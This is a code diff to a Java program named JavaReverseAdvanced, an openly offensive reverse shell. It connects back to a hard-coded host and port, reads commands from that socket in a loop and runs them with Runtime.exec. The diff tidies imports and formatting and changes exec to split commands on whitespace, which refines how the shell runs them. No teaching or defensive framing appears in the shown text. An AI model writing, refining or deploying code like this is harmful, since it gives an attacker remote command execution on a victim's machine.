@@ -1,7 +1,9 @@
-import java.io.*;
-import java.net.*;
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
+import java.io.PrintWriter;
+import java.net.Socket;
 
-public class JavaReverseAdvanced {
+class JavaReverseAdvanced {
     public static void main(String[] args) throws Exception {
         String LHOST = "192.168.1.100";
         int LPORT = 4463;
@@ -12,9 +14,10 @@ public class JavaReverseAdvanced {
 
         while (true) {
             String command = in.readLine();
-            if (command.equals("exit")) break;
+            if (command.equals("exit"))
+                break;
 
-            Process p = Runtime.getRuntime().exec(command);
+            Process p = Runtime.getRuntime().exec(command.split("\\s+"));
             BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
             String line;
             while ((line = reader.readLine()) != null) {
